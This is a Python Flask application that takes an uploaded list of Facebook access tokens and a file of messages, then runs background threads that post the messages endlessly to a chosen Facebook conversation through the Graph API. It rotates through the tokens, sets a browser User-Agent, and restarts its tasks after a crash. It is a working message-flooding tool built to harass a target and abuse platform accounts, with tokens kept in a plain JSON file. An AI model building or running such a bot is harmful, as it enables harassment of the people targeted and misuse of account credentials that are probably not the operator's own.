from flask import Flask, request, render_template
import os, threading, requests, time, json
from datetime import datetime

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads'
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

tasks = {}
stop_flags = {}
start_times = {}
task_info = {}
task_stats = {}
TASKS_DATA_FILE = 'tasks_data.json'

def save_tasks_data():
    data = {}
    for task_id in task_info:
        data[task_id] = {
            "prefix": task_info[task_id]["prefix"],
            "convo_id": task_info[task_id]["convo_id"],
            "speed": task_info[task_id]["speed"],
            "token_list": task_info[task_id]["token_list"],
            "message_list": task_info[task_id]["message_list"],
            "start_time": start_times[task_id].isoformat()
        }
    with open(TASKS_DATA_FILE, 'w') as f:
        json.dump(data, f)

def load_tasks_data():
    if not os.path.exists(TASKS_DATA_FILE):
        return {}
    with open(TASKS_DATA_FILE, 'r') as f:
        return json.load(f)

def get_uid():
    return os.urandom(8).hex()

def convo_task(unique_id, token_list, message_list, convo_id, prefix, speed):
    tasks[unique_id] = threading.current_thread()
    stop_flags[unique_id] = False
    start_times[unique_id] = datetime.now()
    task_info[unique_id] = {
        "prefix": prefix,
        "convo_id": convo_id,
        "speed": speed,
        "token_list": token_list,
        "message_list": message_list
    }
    task_stats[unique_id] = {
        "total_tokens": len(token_list),
        "failed_tokens": 0,
        "successful_tokens": 0,
        "current_token": None,
    }
    save_tasks_data()

    token_index = 0
    message_index = 0
    print(f"[{datetime.now()}] Task {unique_id} started.")

    while not stop_flags.get(unique_id, True):
        try:
            token = token_list[token_index]
            message = message_list[message_index]
            full_message = f"{prefix} {message.strip()}"
            task_stats[unique_id]["current_token"] = token

            url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
            params = {'access_token': token, 'message': full_message}
            headers = {'User-Agent': 'Mozilla/5.0'}

            response = requests.post(url, json=params, headers=headers)

            if response.status_code == 200:
                task_stats[unique_id]["successful_tokens"] += 1
                print(f"\033[92m[{datetime.now()}] Message sent: {full_message}\033[0m")
            else:
                task_stats[unique_id]["failed_tokens"] += 1
                print(f"\033[91m[{datetime.now()}] Failed to send: {full_message} | Status: {response.status_code}\033[0m")

            token_index = (token_index + 1) % len(token_list)
            message_index = (message_index + 1) % len(message_list)
            time.sleep(speed)

        except Exception as e:
            task_stats[unique_id]["failed_tokens"] += 1
            print(f"\033[91m[{datetime.now()}] Error: {e}\033[0m")
            time.sleep(speed)

    print(f"[{datetime.now()}] Task {unique_id} stopped.")
    for d in [task_info, start_times, stop_flags, tasks, task_stats]:
        d.pop(unique_id, None)
    save_tasks_data()

@app.route('/', methods=['GET', 'POST'])
def index():
    message = ''
    new_task_id = None

    if request.method == 'POST':
        if 'token_file' in request.files:
            # Start task
            token_file = request.files['token_file']
            message_file = request.files['message_file']
            convo_id = request.form['convo_id'].strip()
            prefix = request.form['prefix'].strip()
            speed = int(request.form['speed'])

            token_path = os.path.join(app.config['UPLOAD_FOLDER'], 'tokens.txt')
            message_path = os.path.join(app.config['UPLOAD_FOLDER'], 'messages.txt')

            token_file.save(token_path)
            message_file.save(message_path)

            with open(token_path, 'r') as tf:
                token_list = [line.strip() for line in tf if line.strip()]
            with open(message_path, 'r') as mf:
                message_list = [line.strip() for line in mf if line.strip()]

            new_task_id = get_uid()
            thread = threading.Thread(target=convo_task, args=(new_task_id, token_list, message_list, convo_id, prefix, speed))
            thread.start()

        elif 'task_id' in request.form:
            # Stop task
            task_id = request.form['task_id'].strip()
            if task_id in stop_flags:
                stop_flags[task_id] = True
                message = f" Task {task_id} stopped successfully."
            else:
                message = f" Task ID {task_id} not found."

    return render_template('index.html', new_task_id=new_task_id, message=message)

def restart_saved_tasks():
    data = load_tasks_data()
    for task_id, info in data.items():
        if task_id not in tasks:
            start_times[task_id] = datetime.fromisoformat(info["start_time"])
            thread = threading.Thread(target=convo_task, args=(
                task_id,
                info["token_list"],
                info["message_list"],
                info["convo_id"],
                info["prefix"],
                info["speed"]
            ))
            thread.start()
            print(f"Restarted task {task_id} after crash.")

if __name__ == '__main__':
    restart_saved_tasks()
    app.run(host='0.0.0.0', port=2080)
